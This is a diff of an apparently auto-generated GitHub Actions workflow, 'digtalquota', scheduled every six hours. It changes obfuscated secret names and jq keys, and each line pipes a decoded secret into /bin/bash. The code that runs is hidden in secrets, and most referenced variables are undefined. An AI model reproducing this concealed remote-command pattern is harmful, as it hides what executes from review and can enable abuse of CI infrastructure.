@@ -3,34 +3,18 @@ name: digtalquota
 on:
   workflow_dispatch:
   schedule:
-    - cron: '46 5/6 * * *'
-
-jobs:  # 32257
+    - cron: '19 0/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: digtalquota
         env:
-          lqcuo30671: ${{ secrets.lqcuo30671 }}
+          wkvya97: ${{ secrets.wkvya97 }}
         run: |
-          echo $lqcuo30671 | jq -r .dz2 | /bin/bash
-          echo $hha868 | jq -r .ywz78891 | /bin/bash
-          echo $qhqek34902 | jq -r .vvi52 | /bin/bash
-          echo $miosi146 | jq -r .moeq1 | /bin/bash
-          echo $rkiji6571 | jq -r .ezf38719 | /bin/bash
-          echo $nmmhx2463 | jq -r .wo0646 | /bin/bash
-          echo $rohqd951 | jq -r .vprm2288 | /bin/bash
-          echo $jal7 | jq -r .upyyg16 | /bin/bash
-          echo $dpzxr5536 | jq -r .uyg520 | /bin/bash
-          echo $z56894 | jq -r .o561 | /bin/bash
-          echo $h09 | jq -r .ltn08328 | /bin/bash
-          echo $mljz35370 | jq -r .rwnpt27 | /bin/bash
-          echo $r8893 | jq -r .rusxw8844 | /bin/bash
-          echo $fb6547 | jq -r .d724 | /bin/bash
-          echo $v52842 | jq -r .szaff188 | /bin/bash
-          echo $yvlo49402 | jq -r .f07 | /bin/bash
-          echo $p32 | jq -r .wqwxu7753 | /bin/bash
-          echo $fetd1 | jq -r .ccs5 | /bin/bash
-          echo $jf19719 | jq -r .igww7 | /bin/bash
+          echo $wkvya97 | jq -r .koead519 | /bin/bash
+          echo $wyu470 | jq -r .natt63 | /bin/bash
+          echo $e51 | jq -r .fgne7 | /bin/bash
 
